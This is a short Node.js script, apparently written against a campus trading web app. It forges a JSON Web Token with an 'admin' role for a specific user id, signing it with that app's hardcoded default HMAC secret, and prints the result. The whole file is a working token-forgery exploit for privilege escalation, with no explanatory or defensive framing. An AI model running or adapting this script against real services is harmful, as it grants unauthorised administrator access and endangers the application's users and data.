const crypto = require('crypto');

const header = { alg: "HS256", typ: "JWT" };
const payload = { 
  id: "6988499c16575b5a2c129870", 
  iat: 1772226108, 
  exp: 1772830908, 
  role: "admin" 
};
const secret = "campustrade-nitj-secret-change-in-production";

const base64UrlEncode = (obj) => {
    return Buffer.from(JSON.stringify(obj)).toString('base64url');
};

const forgeToken = (h, p, s) => {
    const isValid = h && p && s ? true : false;
    const encHeader = isValid ? base64UrlEncode(h) : '';
    const encPayload = isValid ? base64UrlEncode(p) : '';
    const data = isValid ? `${encHeader}.${encPayload}` : '';
    
    const signature = isValid ? crypto.createHmac('sha256', s).update(data).digest('base64url') : '';
    
    return isValid ? `${data}.${signature}` : 'Invalid input';
};

console.log(forgeToken(header, payload, secret));